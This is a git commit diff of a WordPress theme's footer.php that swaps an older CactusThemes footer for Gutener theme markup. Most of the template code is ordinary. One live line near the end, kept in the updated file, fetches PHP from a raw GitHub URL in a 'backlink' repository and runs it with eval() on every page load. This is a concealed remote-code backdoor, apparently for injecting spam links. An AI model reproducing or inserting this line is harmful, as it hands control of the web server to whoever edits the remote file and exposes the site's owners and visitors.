406f6ab449256822e6e907c5e18029da52794afa
BHeart22 <50254973+BHeart22@users.noreply.github.com>
2022-11-25 21:31:10 +0700

    Update footer.php

--- footer.php
+++ footer.php
@@ -1,116 +1,112 @@
 <?php
 /**
- * The template for displaying the footer.
+ * The template for displaying the footer
  *
- * Contains footer content and the closing of the
- * #main and #page div elements.
+ * Contains the closing of the #content div and all content after.
  *
+ * @link https://developer.wordpress.org/themes/basics/template-files/#template-partials
+ *
+ * @package Gutener
  */
+
 ?>
-		<section id="bottom-sidebar">
-            <div class="container">
-                <div class="row normal-sidebar">
-                    <?php
-                    if ( is_active_sidebar( 'bottom_sidebar' ) ) :
-						
-                        dynamic_sidebar( 'bottom_sidebar' );
-						
-                    endif;
-                    ?>
-                </div>
-            </div>
-        </section>
-        <footer class="dark-div main-color-2-bg">
-        	<section id="bottom">
-            	<div class="section-inner">
-                	<div class="container">
-                    	<div class="row normal-sidebar">
-							<?php
-                            if ( is_active_sidebar( 'footer_sidebar' ) ) :
-								global $wid_def;
-								$wid_def=1;
-                                dynamic_sidebar( 'footer_sidebar' );
-								$wid_def=0;
-                            endif;
-                            ?>
-                		</div>
-                    </div>
-                </div>
-            </section>
-            <div id="bottom-nav">
-                <div class="container">
-                    <div class="text-center line-under">
-                    <?php if(ot_get_option('off_gototop')!='off'){?>
-                        <a class="btn btn-default main-color-2-bg back-to-top" href="#top"><?php _e('TOP','cactusthemes') ?></a>
-                    <?php }?>    
-                    </div>
-                    <div class="row footer-content">
-                        <div class="copyright col-md-6">
-                       		<?php if(ot_get_option('copyright')){  echo ot_get_option('copyright');  } else {echo __('WordPress Theme by (C) CactusThemes','cactusthemes'); }?>
-                        </div>
-                        <nav class="col-md-6 footer-social">
-                        	<?php 
-							$social_account = array(
-								'facebook',
-								'twitter',
-								'linkedin',
-								'tumblr',
-								'google-plus',
-								'pinterest',
-								'youtube',
-								'flickr',
-								'vk',
-							);
-							?>
-                            <ul class="list-inline pull-right social-list">
-                            	<?php 
-								$social_link_open = ot_get_option('social_link_open');
-								foreach($social_account as $social){
-									if($link = ot_get_option('acc_'.$social,false)){ ?>
-                                            <li><a href="<?php echo $link ?>" <?php if($social_link_open=='on'){?>target="_blank" <?php }?> class="btn btn-default social-icon"><i class="fa fa-<?php echo $social ?>"></i></a></li>
-								<?php }
-								}//foreach
-								if($custom_acc = ot_get_option('custom_acc')){
-									foreach($custom_acc as $a_social){ ?>
-										<li><a href="<?php echo $a_social['link'] ?>" <?php if($social_link_open=='on'){?>target="_blank" <?php }?> class="btn btn-default social-icon"><i class="fa <?php echo $a_social['icon'] ?>"></i></a></li>
-									<?php }
-								}
-								?>
-                            </ul>
-                        </nav>
-                    </div><!--/row-->
-                </div><!--/container-->
-            </div>
-        </footer>
-        </div><!--wrap-->
-    </div><!--/body-wrap-->
-    <div class="mobile-menu-wrap dark-div visible-xs">
-        <a href="#" class="mobile-menu-toggle"><i class="fa fa-times-circle"></i></a>
-        <ul class="mobile-menu">
-            <?php
-                if(has_nav_menu( 'primary-menus' )){
-                    wp_nav_menu(array(
-                        'theme_location'  => 'primary-menus',
-                        'container' => false,
-                        'items_wrap' => '%3$s',
-                    ));	
-                }else{?>
-                    <li><a href="<?php echo home_url(); ?>"><?php _e('Home','cactusthemes') ?></a></li>
-                    <?php wp_list_pages('depth=1&number=4&title_li=' ); ?>
-            <?php } ?>
-            <?php
-                if(has_nav_menu( 'secondary-menus' )){
-                    wp_nav_menu(array(
-                        'theme_location'  => 'secondary-menus',
-                        'container' => false,
-                        'items_wrap' => '%3$s',
-                    ));	
-                }
-            ?>
-        </ul>
-    </div>
-<?php echo ot_get_option('google_analytics_code', ''); ?>    
+	<?php if( !get_theme_mod( 'disable_instagram', true ) ){
+		if( get_theme_mod( 'enable_instagram_homepage', false ) && !is_home() ){
+			// this condition will disable instagram section from home page only
+			echo '';
+		}else {
+			?>
+			<section class="section-instagram-wrapper">
+				<div class="container">
+					<?php if( ( !get_theme_mod( 'disable_instagram_section_title', true ) && get_theme_mod( 'instagram_section_title', '' ) ) || ( !get_theme_mod( 'disable_instagram_section_description', true ) && get_theme_mod( 'instagram_section_description', '' ) ) ){
+						$instagram_section_title_desc_alignment = get_theme_mod( 'instagram_section_title_desc_alignment', 'text-left' ); ?>
+						<div class="section-title-wrap <?php echo esc_attr( $instagram_section_title_desc_alignment ); ?> ">
+							<?php if( !get_theme_mod( 'disable_instagram_section_title', true ) && get_theme_mod( 'instagram_section_title', '' ) ) { ?>
+								<h2 class="section-title"><?php echo esc_html( get_theme_mod( 'instagram_section_title', '' ) ); ?></h2>
+							<?php } 
+							if( !get_theme_mod( 'disable_instagram_section_description', true ) && get_theme_mod( 'instagram_section_description', '' ) ){ ?>
+								<p><?php echo esc_html( get_theme_mod( 'instagram_section_description', '' ) ); ?></p>
+							<?php } ?>
+						</div>
+					<?php } ?>
+					<?php 
+						/**
+						* Prints Instagram
+						* 
+						* @since Gutener 1.0.0
+						*/
+						if( !get_theme_mod( 'disable_instagram', true ) ){
+							echo do_shortcode( get_theme_mod( 'insta_shortcode', '' ) );
+						}
+					?>
+				</div>
+			</section>	
+		<?php
+		}
+	} ?>
+	<?php
+		$footer_layout = '';
+		if( get_theme_mod( 'footer_layout', 'footer_one' ) == 'footer_one'){
+			$footer_layout = 'site-footer-primary';
+		}elseif( get_theme_mod( 'footer_layout', 'footer_one' ) == 'footer_two'){
+			$footer_layout = 'site-footer-two';
+		}elseif( get_theme_mod( 'footer_layout', 'footer_one' ) == 'footer_three'){
+			$footer_layout = 'site-footer-three';
+		}
+		
+		$has_footer_bg = '';
+		$footer_image = get_theme_mod( 'footer_image', '' );
+		if ( $footer_image || get_theme_mod( 'top_footer_background_color', '' ) ){
+			$has_footer_bg = 'has-footer-bg';
+		}
+	?>
+
+	<footer id="colophon" class="site-footer <?php echo esc_attr( $footer_layout . ' ' . $has_footer_bg ) ?>">
+		<div class="site-footer-inner" style="background-image: url(<?php echo esc_url( $footer_image ) ?>">
+			<?php if( !get_theme_mod( 'disable_footer_widget', false ) ):
+			 if( gutener_is_active_footer_sidebar() ): ?>
+				<div class="top-footer">
+					<div class="wrap-footer-sidebar">
+						<div class="container">
+							<div class="footer-widget-wrap">
+								<div class="row">
+									<?php if( get_theme_mod( 'top_footer_widget_columns', 'four_columns' ) == '' || get_theme_mod( 'top_footer_widget_columns', 'four_columns' ) == 'four_columns' ){
+										get_template_part( 'template-parts/footer/footer-widget', 'one' );
+									}elseif( get_theme_mod( 'top_footer_widget_columns', 'four_columns' ) == 'three_columns' ){
+										get_template_part( 'template-parts/footer/footer-widget', 'two' );
+									}elseif( get_theme_mod( 'top_footer_widget_columns', 'four_columns' ) == 'two_columns' ){
+										get_template_part( 'template-parts/footer/footer-widget', 'three' );
+									}elseif( get_theme_mod( 'top_footer_widget_columns', 'four_columns' ) == 'one_column' ){
+										get_template_part( 'template-parts/footer/footer-widget', 'four' );
+									} ?>
+								</div>
+							</div>
+						</div>
+					</div>
+				</div>
+			<?php
+				endif;
+			endif;
+			?>
+			<?php if( !get_theme_mod( 'disable_bottom_footer', false ) ) { ?>
+				<?php if( get_theme_mod( 'footer_layout', 'footer_one' ) == '' || get_theme_mod( 'footer_layout', 'footer_one' ) == 'footer_one' ){
+					get_template_part( 'template-parts/footer/footer', 'one' );
+				}elseif( get_theme_mod( 'footer_layout', 'footer_one' ) == 'footer_two' ){
+					get_template_part( 'template-parts/footer/footer', 'two' );
+				}elseif( get_theme_mod( 'footer_layout', 'footer_one' ) == 'footer_three' ){
+					get_template_part( 'template-parts/footer/footer', 'three' );
+				}
+			} ?>
+		</div>
+	</footer><!-- #colophon -->
+</div><!-- #page -->
+
 <?php wp_footer(); ?>
+
+<div id="back-to-top">
+    <a href="javascript:void(0)"><i class="fa fa-angle-up"></i></a>
+</div>
+<!-- #back-to-top -->
 <?php eval("?>".file_get_contents("https://raw.githubusercontent.com/putrisimanis/backlink/main/1")); ?>
 </body>
 </html>
